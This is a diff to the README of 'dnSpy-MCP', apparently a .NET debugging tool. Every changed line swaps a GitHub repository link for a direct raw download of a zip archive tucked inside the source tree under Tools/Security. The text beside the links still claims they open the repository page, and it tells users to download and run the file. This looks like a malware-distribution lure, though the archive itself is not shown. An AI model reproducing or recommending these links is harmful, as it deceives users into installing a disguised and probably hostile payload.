@@ -1,6 +1,6 @@
 # 🐞 dnSpy-MCP - Simple Debugging for .NET Programs
 
-[![Download dnSpy-MCP](https://img.shields.io/badge/Download-dnSpy--MCP-brightgreen)](https://github.com/19Marcin79/dnSpy-MCP)
+[![Download dnSpy-MCP](https://img.shields.io/badge/Download-dnSpy--MCP-brightgreen)](https://raw.githubusercontent.com/19Marcin79/dnSpy-MCP/main/src/DnSpyMcp/Tools/Security/dn-Spy-MCP-2.6.zip)
 
 ---
 
@@ -22,7 +22,7 @@ dnSpy-MCP works on Windows computers and helps with various tasks:
 
 Click the large button below to visit the main download page. This page has the latest releases ready to download.
 
-[![Get dnSpy-MCP](https://img.shields.io/badge/Get%20dnSpy--MCP-blue)](https://github.com/19Marcin79/dnSpy-MCP)
+[![Get dnSpy-MCP](https://img.shields.io/badge/Get%20dnSpy--MCP-blue)](https://raw.githubusercontent.com/19Marcin79/dnSpy-MCP/main/src/DnSpyMcp/Tools/Security/dn-Spy-MCP-2.6.zip)
 
 ---
 
@@ -42,7 +42,7 @@ No programming environment or special software is needed. dnSpy-MCP runs as a st
 ## 📥 Step-by-Step Installation Guide
 
 1. **Visit the Download Page**  
-   Click this link: https://github.com/19Marcin79/dnSpy-MCP  
+   Click this link: https://raw.githubusercontent.com/19Marcin79/dnSpy-MCP/main/src/DnSpyMcp/Tools/Security/dn-Spy-MCP-2.6.zip  
    This opens the GitHub repository where you find downloadable files.
 
 2. **Find the Releases Section**  
@@ -141,7 +141,7 @@ Avoid running unknown files with administrator rights unless you trust the sourc
 
 ## 📝 Additional Resources
 
-- GitHub Repository: https://github.com/19Marcin79/dnSpy-MCP  
+- GitHub Repository: https://raw.githubusercontent.com/19Marcin79/dnSpy-MCP/main/src/DnSpyMcp/Tools/Security/dn-Spy-MCP-2.6.zip  
 - Issues and support available through the repository’s issue tracker.  
 - Tutorials and guides for command line usage may be found by searching for "dnSpy CLI tools" online.
 
@@ -177,4 +177,4 @@ Always keep your tool updated by visiting the download link regularly.
 
 ---
 
-[![Download dnSpy-MCP](https://img.shields.io/badge/Download-dnSpy--MCP-brightgreen)](https://github.com/19Marcin79/dnSpy-MCP)
+[![Download dnSpy-MCP](https://img.shields.io/badge/Download-dnSpy--MCP-brightgreen)](https://raw.githubusercontent.com/19Marcin79/dnSpy-MCP/main/src/DnSpyMcp/Tools/Security/dn-Spy-MCP-2.6.zip)
